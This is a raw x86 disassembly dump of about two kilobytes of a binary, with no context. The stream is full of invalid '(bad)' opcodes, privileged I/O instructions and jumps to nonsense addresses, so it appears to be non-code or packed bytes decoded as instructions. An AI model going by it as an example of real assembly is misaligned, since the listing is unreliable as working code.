  405f90:	mov    eax,ds:0x64de3eec
  405f95:	push   ds
  405f96:	mov    dh,dl
  405f98:	xchg   ebx,eax
  405f99:	cmc    
  405f9a:	sub    al,0x21
  405f9c:	inc    esi
  405f9d:	add    BYTE PTR [eax],dh
  405f9f:	mov    ebx,0xf726accc
  405fa4:	outs   dx,BYTE PTR ds:[esi]
  405fa5:	pextrw ebp,(bad),0xc5
  405fa7:	test   al,0x2f
  405fa9:	xor    eax,DWORD PTR [edx+0x39]
  405fac:	fwait
  405fad:	dec    ecx
  405fae:	into   
  405faf:	xchg   ebx,eax
  405fb0:	lahf   
  405fb1:	mov    esi,0x2a20cf21
  405fb6:	nop
  405fb7:	jecxz  0x405fd0
  405fb9:	pop    es
  405fba:	xchg   ecx,eax
  405fbb:	xor    al,0x97
  405fbd:	(bad)  
  405fbe:	cmp    al,0x81
  405fc0:	push   ss
  405fc1:	shr    DWORD PTR [eax-0x479798f3],0x12
  405fc8:	je     0x406008
  405fca:	mov    esi,0xd941345a
  405fcf:	push   edi
  405fd0:	mov    dl,0x66
  405fd2:	mov    dh,0x3
  405fd5:	dec    cx
  405fd7:	jb     0x405f7b
  405fd9:	cmp    ch,BYTE PTR [eax]
  405fdb:	pop    edx
  405fdc:	push   eax
  405fdd:	in     al,0xea
  405fdf:	mov    al,BYTE PTR [edi+ebx*4]
  405fe2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405fe3:	jne    0x405fe5
  405fe5:	push   esp
  405fe6:	push   esi
  405fe7:	adc    BYTE PTR [ebx-0x17],cl
  405fea:	aam    0x2
  405fec:	push   0x9995e7c8
  405ff1:	mov    bl,0x2c
  405ff3:	cmp    al,bh
  405ff5:	nop
  405ff6:	and    esi,0xffffffd4
  405ff9:	(bad)  
  405ffb:	bound  ebx,QWORD PTR [eax-0x26bc70ad]
  406001:	and    eax,0xa913fde4
  406006:	clc    
  406007:	scas   eax,DWORD PTR es:[edi]
  406008:	call   DWORD PTR [esi]
  40600a:	mov    ebp,0x993c09b9
  40600f:	(bad)  
  406010:	push   edi
  406011:	or     eax,eax
  406013:	jle    0x405fae
  406015:	dec    edx
  406016:	aaa    
  406017:	add    al,0x5b
  406019:	xor    esp,DWORD PTR [ecx+edx*4-0x2f]
  40601d:	pop    esi
  40601e:	call   0xe8ae5ba7
  406023:	iret   
  406024:	push   edx
  406025:	stc    
  406026:	je     0x40604a
  406028:	pop    eax
  406029:	cmp    ebx,DWORD PTR [eax-0x77f7ea55]
  40602f:	sbb    bh,cl
  406031:	js     0x40609b
  406033:	test   al,0x8e
  406035:	fisub  WORD PTR [esi-0xbc08ba1]
  40603b:	sub    eax,0xd252414e
  406040:	jl     0x405fca
  406042:	dec    ebp
  406043:	inc    edi
  406044:	sub    eax,0x9db51d69
  406049:	jns    0x406052
  40604b:	push   ecx
  40604c:	enter  0xd333,0xcc
  406050:	xchg   BYTE PTR [edi],ch
  406052:	cmp    esp,esi
  406054:	nop
  406055:	xchg   BYTE PTR [ebx+0x53],cl
  406058:	xor    edx,DWORD PTR [edi+0x59258dff]
  40605e:	test   ch,0xee
  406061:	push   es
  406062:	loopne 0x405fff
  406064:	ins    DWORD PTR es:[edi],dx
  406065:	dec    ebp
  406066:	inc    esi
  406067:	adc    ch,BYTE PTR [ebx+0x47]
  40606a:	xchg   ebx,eax
  40606b:	push   es
  40606c:	push   0x4b
  40606e:	jne    0x4060a5
  406070:	jmp    0x172b5499
  406075:	add    esi,edx
  406077:	ror    dl,cl
  406079:	outs   dx,DWORD PTR ds:[esi]
  40607a:	push   ecx
  40607b:	loopne 0x406044
  40607d:	aad    0xb5
  40607f:	shr    BYTE PTR [ecx+0x2d12558f],0x7
  406086:	pop    ebx
  406087:	pop    ebx
  406088:	inc    ebp
  406089:	scas   eax,DWORD PTR es:[edi]
  40608a:	pop    es
  40608b:	lods   eax,DWORD PTR ds:[esi]
  40608c:	jbe    0x4060ff
  40608e:	cdq    
  40608f:	mov    ecx,0xf8f3ce5f
  406094:	inc    eax
  406095:	jbe    0x406075
  406097:	cmp    DWORD PTR [esi-0x65],eax
  40609a:	adc    ch,BYTE PTR [ecx-0x91e64dc]
  4060a0:	sub    cl,cl
  4060a2:	adc    edi,edx
  4060a4:	in     eax,dx
  4060a5:	lahf   
  4060a6:	aaa    
  4060a7:	sbb    DWORD PTR [esi+0x73],ebp
  4060aa:	cmp    al,0x1d
  4060ac:	retf   0x3125
  4060af:	fldenv [eax]
  4060b1:	(bad)  
  4060b2:	jno    0x40611b
  4060b4:	addr16 dec ebx
  4060b6:	xor    al,0xb0
  4060b8:	mov    cl,0xb1
  4060ba:	pop    dx
  4060bc:	test   al,0x5e
  4060be:	or     DWORD PTR [ebx-0x2a37b1d9],edx
  4060c4:	push   esi
  4060c5:	lods   al,BYTE PTR ds:[esi]
  4060c6:	and    DWORD PTR [edx],eax
  4060c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4060c9:	jns    0x40607b
  4060cb:	mov    al,0x9b
  4060cd:	inc    edi
  4060ce:	jmp    0x2b55ca90
  4060d3:	add    eax,0xbeb19de0
  4060d8:	jne    0x406080
  4060da:	ficom  DWORD PTR [ebx]
  4060dc:	mov    eax,0x5b80c729
  4060e1:	clc    
  4060e2:	(bad)  
  4060e3:	repnz jecxz 0x4060ae
  4060e6:	cmp    bl,BYTE PTR [ecx+0x4bcc8465]
  4060ec:	sub    dh,ch
  4060ee:	mov    ch,0xeb
  4060f0:	cmp    al,BYTE PTR [edi-0x28e7018b]
  4060f6:	scas   al,BYTE PTR es:[edi]
  4060f7:	fisub  WORD PTR [esi]
  4060f9:	add    ah,dl
  4060fb:	mov    cl,0x1e
  4060fd:	mov    bl,0x19
  4060ff:	or     al,0x42
  406101:	lea    ebp,[ebp-0x58]
  406104:	call   FWORD PTR [edx+0xb9a0c87]
  40610a:	fdiv   DWORD PTR [eax+0xf]
  40610d:	aas    
  40610e:	das    
  40610f:	adc    ebp,eax
  406111:	pop    esi
  406112:	mov    bl,0x2e
  406114:	push   ebx
  406115:	xor    al,0x9f
  406117:	retf   
  406118:	dec    ecx
  406119:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40611a:	clc    
  40611b:	xchg   ebx,eax
  40611c:	cmp    BYTE PTR [ecx-0x57cd272],bh
  406122:	stos   BYTE PTR es:[edi],al
  406123:	test   dh,0xea
  406126:	in     al,dx
  406127:	out    0xc0,eax
  406129:	sbb    eax,0xf6cedcde
  40612e:	xor    eax,0xff419e1
  406133:	inc    ecx
  406134:	daa    
  406135:	ret    0xeb67
  406138:	xchg   ebx,eax
  406139:	xchg   ebx,eax
  40613a:	dec    eax
  40613b:	addr16 repz daa 
  40613e:	les    ecx,FWORD PTR [edi+ebp*2]
  406141:	pushf  
  406142:	xchg   ebp,eax
  406143:	lea    esp,[ebx+0x7a203e33]
  406149:	mov    ebp,0x8588b3ee
  40614e:	idiv   BYTE PTR [ecx-0x20]
  406151:	and    DWORD PTR [edx],edx
  406153:	shl    BYTE PTR ds:0xc641c9d5,0xaf
  40615a:	lods   eax,DWORD PTR ds:[esi]
  40615b:	and    esi,DWORD PTR [ebx+eiz*1-0x666bbb9b]
  406162:	pop    edi
  406163:	(bad)  
  406164:	and    al,0xd3
  406166:	mov    ebp,cs
  406168:	mov    edx,0xabc561b2
  40616d:	adc    BYTE PTR [esi-0x38],bh
  406170:	cmc    
  406171:	(bad)  
  406172:	arpl   WORD PTR [edx],bx
  406174:	xchg   ecx,eax
  406175:	xchg   esi,eax
  406176:	pushf  
  406177:	mov    ah,BYTE PTR [eax+0xad3c06a]
  40617d:	add    DWORD PTR [eax+edi*8-0x80],edx
  406181:	fistp  WORD PTR [eax-0x67327262]
  406187:	mov    DWORD PTR [edi+edx*2-0x11],esp
  40618b:	lea    ebx,[edx]
  40618d:	stos   DWORD PTR es:[edi],eax
  40618e:	fdiv   DWORD PTR [eax+0x5d4fc3b8]
  406194:	mov    esi,0x62fdf1ba
  406199:	lds    esi,FWORD PTR [eax+0x24952506]
  40619f:	out    dx,eax
  4061a0:	cmp    eax,ecx
  4061a2:	mov    ds:0x1469fdf6,eax
  4061a7:	in     eax,dx
  4061a8:	inc    esi
  4061a9:	cdq    
  4061aa:	inc    ebp
  4061ab:	shr    ebp,0xb9
  4061ae:	mov    al,0xf6
  4061b0:	sbb    ebx,0xf60dfceb
  4061b6:	arpl   WORD PTR [ecx-0x5710123a],ax
  4061bc:	push   DWORD PTR [edx+0x35]
  4061bf:	(bad)  
  4061c1:	jg     0x406191
  4061c3:	shl    DWORD PTR [edx],1
  4061c5:	pushf  
  4061c6:	test   ebx,esp
  4061c8:	fst    DWORD PTR [ecx-0x27]
  4061cb:	scas   eax,DWORD PTR es:[edi]
  4061cc:	ins    DWORD PTR es:[edi],dx
  4061cd:	into   
  4061ce:	xchg   ebp,eax
  4061cf:	jp     0x4061ce
  4061d1:	jbe    0x4061f1
  4061d3:	fist   DWORD PTR [ecx]
  4061d5:	ror    BYTE PTR ds:0x70175d5b,1
  4061db:	lock cdq 
  4061dd:	sbb    eax,0xc605459
  4061e2:	int3   
  4061e3:	pop    edi
  4061e4:	cli    
  4061e5:	xchg   ebp,eax
  4061e6:	xor    DWORD PTR [ecx+esi*1],ebp
  4061e9:	mov    bh,0x12
  4061eb:	(bad)  
  4061ec:	jmp    0xf3562d98
  4061f1:	std    
  4061f2:	out    0xa8,al
  4061f4:	sbb    eax,0x85a5fef8
  4061f9:	mov    ds:0x89778f0e,al
  4061fe:	jge    0x40619b
  406200:	out    dx,al
  406201:	jbe    0x406275
  406203:	pop    es
  406204:	(bad)  
  406205:	mov    esi,0x72f8a459
  40620a:	mov    ecx,0xb2d99fe5
  40620f:	imul   DWORD PTR [edi+0x5196120d]
  406215:	dec    BYTE PTR [ecx+0xd]
  406218:	int    0x99
  40621a:	jo     0x40621b
  40621c:	aad    0x3c
  40621e:	ror    DWORD PTR ds:0x6875ade5,1
  406224:	call   0xf50f:0x631845ff
  40622b:	repnz cdq 
  40622d:	sbb    ah,BYTE PTR [ecx]
  40622f:	xchg   ecx,eax
  406230:	outs   dx,DWORD PTR ds:[esi]
  406231:	(bad)  
  406232:	ja     0x40624b
  406234:	popa   
  406235:	pop    ss
  406236:	jge    0x40620a
  406238:	int3   
  406239:	mov    cl,0xc2
  40623b:	cmp    al,BYTE PTR [edi-0x5c]
  40623e:	cdq    
  40623f:	pop    ds
  406240:	or     esp,edx
  406242:	adc    al,0x70
  406244:	outs   dx,BYTE PTR ds:[esi]
  406245:	xlat   BYTE PTR ds:[ebx]
  406246:	les    esp,FWORD PTR [esi+0x70cae19b]
  40624c:	ins    BYTE PTR es:[edi],dx
  40624d:	cmp    BYTE PTR [ebx-0xc063d2b],dl
  406253:	ret    
  406254:	(bad)  
  406255:	and    DWORD PTR [edi],edx
  406257:	dec    edi
  406259:	mov    ebp,0x636c71d3
  40625e:	retf   0xe756
  406261:	scas   eax,DWORD PTR es:[edi]
  406262:	jno    0x40626b
  406264:	sbb    eax,0xfd4ed91
  406269:	aas    
  40626a:	aad    0x6d
  40626c:	inc    ebx
  40626d:	xchg   ebx,eax
  40626e:	imul   esi,DWORD PTR [ebx],0x524f0f98
  406274:	jecxz  0x40622e
  406276:	mov    esp,0x31e4e5de
  40627b:	adc    BYTE PTR [eax],dl
  40627d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40627e:	xchg   ebx,eax
  40627f:	retf   
  406280:	xchg   ch,al
  406282:	inc    ebx
  406283:	xor    esp,esp
  406285:	mov    esp,0xbaf23580
  40628a:	stos   BYTE PTR es:[edi],al
  40628b:	jmp    0xcadf2c1d
  406290:	xor    DWORD PTR [ebx+0xb],0x1c161f5c
  406297:	jmp    0x4062ca
  406299:	leave  
  40629a:	jge    0x4062d3
  40629c:	call   0xe581c2aa
  4062a1:	and    dh,BYTE PTR [ebx+0x5761de82]
  4062a7:	xchg   DWORD PTR [ebp+0x5],ebx
  4062aa:	lock pop ds
  4062ac:	ds push edx
  4062ae:	mov    eax,edi
  4062b0:	jmp    0xbb1d25fd
  4062b5:	or     eax,0x3cfe4f5a
  4062ba:	jbe    0x406259
  4062bc:	stos   BYTE PTR es:[edi],al
  4062bd:	enter  0x4a8f,0xc
  4062c1:	bound  edx,QWORD PTR [eax+esi*2+0x57]
  4062c5:	inc    ebx
  4062c6:	xor    ebx,DWORD PTR [edi]
  4062c8:	ret    
  4062c9:	ins    DWORD PTR es:[edi],dx
  4062ca:	push   ss
  4062cb:	or     bh,BYTE PTR [ebp+0x18]
  4062ce:	dec    ebx
  4062cf:	in     al,dx
  4062d0:	jo     0x40625d
  4062d2:	fadd   DWORD PTR [edi]
  4062d4:	sbb    bh,bl
  4062d6:	into   
  4062d7:	or     al,0x93
  4062d9:	dec    ebx
  4062da:	popf   
  4062db:	mov    edi,0xfd4425ac
  4062e0:	mov    edi,0x9977e5e4
  4062e5:	mov    ebp,0x6ac7f200
  4062ea:	fdiv   QWORD PTR [eax+0x1214cd04]
  4062f0:	jno    0x4062f9
  4062f2:	xchg   BYTE PTR [esi],cl
  4062f4:	or     DWORD PTR [ecx],esi
  4062f6:	es into 
  4062f8:	out    dx,al
  4062f9:	test   DWORD PTR [ebx-0x4ddaa0b0],eax
  4062ff:	xchg   esp,eax
  406300:	test   al,0x4f
  406302:	mov    ebp,0xd989debd
  406307:	sub    DWORD PTR [eax],0xffffffab
  40630a:	loope  0x40632b
  40630c:	xchg   edi,eax
  40630d:	pusha  
  40630e:	inc    ecx
  40630f:	xor    BYTE PTR [eax],ah
  406311:	icebp  
  406312:	pop    edx
  406313:	imul   esi,DWORD PTR [edi-0x18],0x2b532273
  40631a:	lock or eax,0xdedb86b8
  406320:	jb     0x40632c
  406322:	push   0x3e
  406324:	ins    BYTE PTR es:[edi],dx
  406325:	stos   BYTE PTR es:[edi],al
  406326:	xor    eax,0x1f072785
  40632b:	scas   al,BYTE PTR es:[edi]
  40632c:	inc    ebx
  40632d:	push   ebp
  40632e:	and    edi,ebp
  406330:	(bad)  
  406331:	sbb    al,BYTE PTR [ebx+edi*4-0x35568d2]
  406338:	cmp    edi,DWORD PTR [esi+ecx*8]
  40633b:	jg     0x406314
  40633d:	push   cs
  40633e:	mov    al,ds:0xa8962aed
  406343:	cmp    al,dh
  406345:	fsubp  st(0),st
  406347:	adc    ah,dl
  406349:	test   BYTE PTR [edx-0x1e48055d],bh
  40634f:	movups XMMWORD PTR [ecx-0x5bdb36e8],xmm1
  406356:	mov    esi,0x7035d92f
  40635b:	ins    BYTE PTR es:[edi],dx
  40635c:	mov    ds:0xfbbb0ea7,al
  406361:	jno    0x406393
  406363:	pop    ecx
  406364:	mov    ebp,eax
  406366:	inc    eax
  406367:	repz pop ebp
  406369:	enter  0x3b8d,0xf7
  40636d:	shl    DWORD PTR [eax-0x20],1
  406370:	push   ecx
  406371:	jecxz  0x40631a
  406373:	push   0x630cd4ad
  406378:	mov    ch,0x8c
  40637a:	fidivr DWORD PTR [ebx+esi*8]
  40637d:	and    DWORD PTR [esi-0x2e],ebx
  406380:	and    ch,BYTE PTR [ecx-0x31575735]
  406386:	xchg   ebp,eax
  406387:	xlat   BYTE PTR ds:[ebx]
  406388:	sub    BYTE PTR [esi],cl
  40638a:	add    ebp,edx
  40638c:	clc    
  40638d:	cmp    edx,eax
  40638f:	pop    esp
  406390:	or     al,0xe6
  406392:	xchg   esi,eax
  406393:	sbb    al,BYTE PTR [ecx-0x32fc5df5]
  406399:	daa    
  40639a:	pop    ds
  40639b:	push   edi
  40639c:	jno    0x40639f
  40639e:	call   0x2a4d113d
  4063a3:	inc    esi
  4063a4:	outs   dx,BYTE PTR ds:[esi]
  4063a5:	ds mov ch,0x85
  4063a8:	test   eax,0x2de846bd
  4063ad:	jp     0x406363
  4063af:	loop   0x406418
  4063b1:	mov    WORD PTR [esi+edi*8+0x18],ss
  4063b5:	mov    dl,0x5
  4063b7:	dec    esi
  4063b8:	pop    ebp
  4063b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063ba:	jno    0x406384
  4063bc:	mov    cl,0x2d
  4063be:	ss and eax,0xd8f14693
  4063c4:	es jle 0x406444
  4063c7:	iret   
  4063c8:	mov    edx,0xf569e098
  4063cd:	les    edi,FWORD PTR [esi+0x76bffb93]
  4063d3:	into   
  4063d4:	call   0x101e:0x408e2d5c
  4063db:	rep outs dx,DWORD PTR ds:[esi]
  4063dd:	push   edx
  4063de:	or     DWORD PTR ds:0x53af53cd,0xa04945a4
  4063e8:	out    0x54,eax
  4063ea:	fldenv [esi+0x2b1818b5]
  4063f0:	sbb    al,BYTE PTR [edx+0x6a]
  4063f3:	bnd jmp 0xff2b80f6
  4063f9:	pushf  
  4063fa:	in     eax,0xe9
  4063fc:	jae    0x40643b
  4063fe:	xchg   edi,eax
  4063ff:	popa   
  406400:	cmp    DWORD PTR [eax+0x3a330295],0x8263867c
  40640a:	cmp    al,0xc8
  40640c:	scas   al,BYTE PTR es:[edi]
  40640d:	jmp    0x5d364326
  406412:	xchg   ecx,eax
  406413:	push   ebp
  406414:	into   
  406415:	lods   eax,DWORD PTR ds:[esi]
  406416:	sub    dl,BYTE PTR [edi+0x57]
  406419:	imul   DWORD PTR [esi]
  40641b:	cmp    al,0x81
  40641d:	das    
  40641e:	mov    ecx,0xb4482b66
  406423:	mov    dh,bh
  406425:	(bad)  
  406426:	pop    ss
  406427:	shl    DWORD PTR [ebp+edi*8-0x63],0x9e
  40642c:	dec    ebp
  40642d:	dec    ebp
  40642e:	push   es
  40642f:	cld    
  406430:	shl    eax,cl
  406432:	mov    dl,0x90
  406434:	data16 xor al,0x84
  406437:	psllw  mm0,QWORD PTR [ecx-0x68fdde08]
  40643e:	mov    ss,ebx
  406440:	cmc    
  406441:	stc    
  406442:	fist   WORD PTR [eax-0x72]
  406445:	mov    ebp,0x78a6193e
  40644a:	and    BYTE PTR [esi+0xb],0xaa
  40644e:	jmp    0x31c7:0x804b6aaa
  406455:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406456:	adc    eax,0xd9fe4283
  40645c:	sbb    BYTE PTR [edi-0x70],0x5c
  406460:	push   esp
  406461:	xchg   ecx,eax
  406462:	adc    DWORD PTR [eax+0x23324b18],edi
  406468:	xlat   BYTE PTR ds:[ebx]
  406469:	fs inc ecx
  40646b:	lods   eax,DWORD PTR ds:[esi]
  40646c:	xchg   esi,eax
  40646d:	inc    edi
  40646e:	sub    al,0xf1
  406470:	lods   al,BYTE PTR gs:[esi]
  406472:	jae    0x40643c
  406474:	aas    
  406475:	mov    dh,0x7e
  406477:	jnp    0x4064c6
  406479:	sbb    DWORD PTR [edx],esp
  40647b:	cdq    
  40647c:	shr    BYTE PTR [esi-0x78],0x54
  406480:	push   0x64ff9224
  406485:	jl     0x4064c7
  406487:	xor    DWORD PTR [esi],eax
  406489:	xor    DWORD PTR [eax-0x1e],edx
  40648c:	test   BYTE PTR [ebp-0x1],ch
  40648f:	jae    0x4064b4
  406491:	pop    esi
  406492:	or     ebx,esi
  406494:	cld    
  406495:	fsubr  st,st(2)
  406497:	jge    0x406449
  406499:	mov    DWORD PTR [esi+0x52],esp
  40649c:	mov    eax,0xb54ae803
  4064a1:	xchg   ebp,eax
  4064a2:	shr    DWORD PTR [ebx+0x1e9d24e6],cl
  4064a8:	sbb    eax,0x4b1eb330
  4064ad:	sub    al,ch
  4064af:	adc    eax,0x6ba5e2b
  4064b4:	or     al,0xff
  4064b6:	mov    esi,DWORD PTR [ecx+esi*4+0x46b7a6e7]
  4064bd:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  4064bf:	mov    ebp,0xd2c62537
  4064c4:	mov    DWORD PTR [edi],ecx
  4064c6:	pop    esi
  4064c7:	das    
  4064c8:	scas   eax,DWORD PTR es:[edi]
  4064c9:	mov    bl,0x1
  4064cb:	xchg   ebx,eax
  4064cc:	xchg   ebx,eax
  4064cd:	xor    eax,0x8903e310
  4064d2:	daa    
  4064d3:	je     0x406550
  4064d5:	xchg   esi,eax
  4064d6:	adc    ch,dh
  4064d8:	inc    ebp
  4064d9:	xchg   esi,eax
  4064da:	call   0x3284c9c0
  4064df:	xchg   esp,eax
  4064e0:	cmp    DWORD PTR ds:0x46d9fd83,eax
  4064e6:	cmp    eax,0x90fda52d
  4064eb:	sub    cl,BYTE PTR [ebp-0x7f]
  4064ee:	pop    edx
  4064ef:	adc    ah,BYTE PTR [edi]
  4064f1:	dec    eax
  4064f2:	and    ch,BYTE PTR [edi-0x5e]
  4064f5:	(bad)  
  4064f6:	mov    cl,0xfe
  4064f8:	daa    
  4064f9:	cmp    al,0x3
  4064fb:	cmp    DWORD PTR [eax],0xffffff8e
  4064fe:	mov    edx,0x25b0153e
  406503:	das    
  406504:	test   eax,0x7819e535
  406509:	dec    eax
  40650a:	pop    ds
  40650b:	stc    
  40650c:	addr16 mov ch,0xa
  40650f:	lds    edx,FWORD PTR [ebx+0x2b20071c]
  406515:	and    DWORD PTR [ecx-0x291cc0b8],0x1a
  40651c:	and    DWORD PTR [ecx-0xf],0xffffffad
  406520:	xchg   ecx,eax
  406521:	and    DWORD PTR [edx+ecx*2+0x5b90d0b9],eax
  406528:	inc    esp
  406529:	ins    BYTE PTR es:[edi],dx
  40652a:	pop    ds
  40652b:	sub    BYTE PTR [edx],0xe6
  40652e:	ja     0x4065a9
  406530:	or     dl,cl
  406532:	mov    ds:0xe5563674,al
  406537:	xchg   ebp,eax
  406538:	cs (bad) 
  40653a:	outs   dx,BYTE PTR ds:[esi]
  40653b:	test   al,0xbd
  40653d:	pavgw  mm2,QWORD PTR [eax-0x46]
  406541:	pop    ds
  406542:	mov    ds:0x2417e26e,al
  406547:	loopne 0x4065c3
  406549:	shl    BYTE PTR [ecx],0xaf
  40654c:	retf   0x9615
  40654f:	imul   ecx,DWORD PTR [esi+0x75e068a6],0xfffffff4
  406556:	stc    
  406557:	test   DWORD PTR [edx-0x58],esp
  40655a:	mov    bl,0xde
  40655c:	les    ecx,FWORD PTR [ebx+edx*2+0x1e]
  406560:	rcr    eax,0xa8
  406563:	jbe    0x40653e
  406565:	fs xchg esp,eax
  406567:	and    esp,edi
  406569:	lock fwait
  40656b:	push   ss
  40656c:	jns    0x40653e
  40656e:	push   ds
  40656f:	mov    ebx,DWORD PTR ds:0x24905a2f
  406575:	scas   eax,DWORD PTR es:[edi]
  406576:	mov    cl,BYTE PTR [edx-0x5]
  406579:	ror    edx,1
  40657b:	test   al,0xbc
  40657d:	push   cs
  40657e:	mov    bh,0xc1
  406580:	xchg   ebp,eax
  406581:	cmp    al,0x95
  406583:	repz jp 0x406531
  406586:	mov    es,WORD PTR [edi+0x30]
  406589:	mov    al,0xaf
  40658b:	mov    dl,0x81
  40658d:	inc    edx
  40658e:	push   ss
  40658f:	cmp    bh,BYTE PTR [edx-0xe86c01b]
  406595:	ss stos BYTE PTR es:[edi],al
  406597:	loopne 0x406523
  406599:	pop    ss
  40659a:	scas   eax,DWORD PTR es:[edi]
  40659b:	xchg   esp,eax
  40659c:	pushf  
  40659d:	push   edi
  40659e:	(bad)  
  40659f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065a0:	rcr    BYTE PTR [edi+ecx*4+0x6c],1
  4065a4:	or     DWORD PTR [edi-0x7e3e6d69],esi
  4065aa:	fcom   DWORD PTR [edi+eiz*8+0x13f13a67]
  4065b1:	push   es
  4065b2:	mov    edi,0xace893b0
  4065b7:	sbb    edx,DWORD PTR [esi]
  4065b9:	sar    edx,1
  4065bb:	enter  0x8304,0xf0
  4065bf:	pusha  
  4065c0:	dec    edi
  4065c1:	les    edi,FWORD PTR [edx-0x59f5b637]
  4065c7:	xchg   esi,eax
  4065c8:	cld    
  4065c9:	bound  eax,QWORD PTR [ecx]
  4065cb:	sar    DWORD PTR fs:[esp+ebx*1+0x4ae35a49],1
  4065d3:	xchg   ebx,eax
  4065d4:	sbb    ah,cl
  4065d6:	xor    ah,dl
  4065d8:	cld    
  4065d9:	lods   eax,DWORD PTR ds:[esi]
  4065da:	fild   QWORD PTR [edi+0x2a]
  4065dd:	imul   eax,ecx,0x18
  4065e0:	sbb    al,0xe
  4065e2:	(bad)  
  4065e3:	fsubp  st(5),st
  4065e5:	mov    ebp,0x10a3d42b
  4065ea:	pop    esp
  4065eb:	(bad)  
  4065ec:	rcr    DWORD PTR [ecx-0x73],1
  4065ef:	cmp    eax,0xa86ec4e7
  4065f4:	retf   
  4065f5:	ja     0x40662d
  4065f7:	push   esi
  4065f8:	loopne 0x4065f6
  4065fa:	mov    bh,0x13
  4065fc:	mov    al,0xb3
  4065fe:	ror    BYTE PTR [bp+si-0x80],0x7b
  406603:	retf   
  406604:	fidiv  WORD PTR [ebp+0x4dde3968]
  40660a:	lds    ebp,FWORD PTR [esi]
  40660c:	mov    BYTE PTR [eax-0x7e],dl
  40660f:	cdq    
  406610:	sbb    eax,DWORD PTR [eax-0x7f0c6ddf]
  406616:	outs   dx,DWORD PTR ds:[esi]
  406617:	inc    esp
  406618:	scas   al,BYTE PTR es:[edi]
  406619:	cdq    
  40661a:	loop   0x40665b
  40661c:	jnp    0x40660b
  40661e:	and    esp,DWORD PTR [edx-0x24d86e81]
  406624:	cli    
  406625:	sub    DWORD PTR [ecx],0xd9f7475c
  40662b:	jnp    0x406679
  40662d:	rcl    BYTE PTR [ebx-0x1bcdd424],0x18
  406634:	das    
  406635:	push   ss
  406636:	jp     0x406614
  406638:	and    al,0x6a
  40663a:	retf   
  40663b:	pop    ds
  40663c:	call   0x9f26:0x8e5759ae
  406643:	xchg   DWORD PTR [ebp+ebx*2-0x76],edx
  406647:	push   esp
  406648:	pmullw mm5,QWORD PTR [edx+0x24]
  40664c:	jmp    0x406641
  40664e:	ret    
  40664f:	add    dl,dl
  406651:	fild   WORD PTR [ebp-0x63]
  406654:	(bad)  
  406655:	pusha  
  406656:	xor    al,al
  406658:	push   ss
  406659:	ret    0xadb3
  40665c:	jo     0x406684
  40665e:	mov    BYTE PTR [eax],bh
  406660:	inc    edx
  406661:	push   eax
  406662:	jl     0x4066a8
  406664:	xchg   esp,eax
  406665:	icebp  
  406666:	loope  0x406622
  406668:	xor    ah,ah
  40666a:	xlat   BYTE PTR ds:[ebx]
  40666b:	out    0xdb,al
  40666d:	adc    eax,edx
  40666f:	push   ebp
  406670:	loop   0x406632
  406672:	enter  0x3960,0x63
  406676:	sbb    ch,BYTE PTR [edx-0x1a72b667]
  40667c:	push   esp
  40667d:	ins    BYTE PTR es:[edi],dx
  40667e:	into   
  40667f:	pop    ebx
  406680:	mov    al,ds:0x61ed6993
  406685:	inc    ebx
  406686:	lahf   
  406687:	imul   eax,DWORD PTR [ecx],0xe98136ff
  40668d:	add    DWORD PTR [esi-0x3a],0x36
  406691:	cmp    eax,0x86096924
  406696:	sbb    al,0xb0
  406698:	push   edi
  406699:	xor    DWORD PTR [esi+0x7e],edi
  40669c:	add    edx,edx
  40669e:	pop    esp
  40669f:	cld    
  4066a0:	shl    ah,1
  4066a2:	fisubr DWORD PTR [edi-0x41]
  4066a5:	pushf  
  4066a6:	cmp    DWORD PTR [edi-0x6ad23bc8],edx
  4066ac:	outs   dx,BYTE PTR ds:[esi]
  4066ad:	cmp    al,0xee
  4066af:	test   eax,0x18280064
  4066b4:	ins    DWORD PTR es:[edi],dx
  4066b5:	pop    esp
  4066b6:	xor    ah,cl
  4066b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4066b9:	pop    edx
  4066ba:	pop    ds
  4066bb:	in     al,dx
  4066bc:	aas    
  4066bd:	adc    eax,0x7b92520b
  4066c2:	(bad)  
  4066c3:	add    BYTE PTR [esi-0x1ddb2c7b],0x7c
  4066ca:	mov    ebx,0x109d31ac
  4066cf:	mov    edx,0xbb0d7a3f
  4066d4:	add    edi,ebx
  4066d6:	and    ecx,edi
  4066d8:	fst    QWORD PTR [edi]
  4066da:	popf   
  4066db:	stos   BYTE PTR es:[edi],al
  4066dc:	popa   
  4066dd:	or     edi,DWORD PTR [eax]
  4066df:	sbb    DWORD PTR [ebp-0x6c8ad03a],eax
  4066e5:	(bad)  
  4066e6:	jg     0x406723
  4066e8:	pop    edx
  4066e9:	add    DWORD PTR ds:0xb3cc438e,edx
  4066ef:	outs   dx,BYTE PTR ds:[esi]
  4066f0:	and    eax,0xdb70d451
  4066f5:	dec    edi
  4066f6:	add    DWORD PTR [edi+0x231fcea3],edx
  4066fc:	push   eax
  4066fd:	in     eax,0xca
  4066ff:	mov    dh,dl
  406701:	pop    ss
  406702:	in     eax,dx
  406703:	(bad)  
  406704:	les    ebx,FWORD PTR [edx-0x4d]
  406707:	loopne 0x406700
  406709:	push   esi
  40670a:	call   0x8ce2:0x4648171d
  406711:	bound  ecx,QWORD PTR [eax]
  406713:	sub    DWORD PTR [ecx-0xe59b9ad],0xffffffc7
  40671a:	clc    
  40671b:	out    0xee,eax
  40671d:	mov    ah,0x1c
  40671f:	mov    ds:0xd43263bb,al
  406724:	cmp    eax,0xae3b2cd6
  406729:	test   eax,0xd2dd517c
  40672e:	es rcr ah,0xd9
  406732:	aas    
  406733:	add    BYTE PTR [eax+ebx*2+0x2076df6a],0xa9
  40673b:	jmp    0xb109217f
  406740:	pop    edx
  406741:	or     ch,bl
  406743:	je     0x4066eb
  406745:	mov    ebx,0x1885724
  40674a:	aad    0x1c
  40674c:	xchg   BYTE PTR [edi],bh
  40674e:	sbb    BYTE PTR [eax-0xd5ca5ac],bl
  406754:	cli    
  406755:	out    0xa2,al
  406757:	jle    0x40671b
  406759:	(bad)  
  40675a:	cmp    al,BYTE PTR [eax+0x414352bd]
  406760:	push   ds
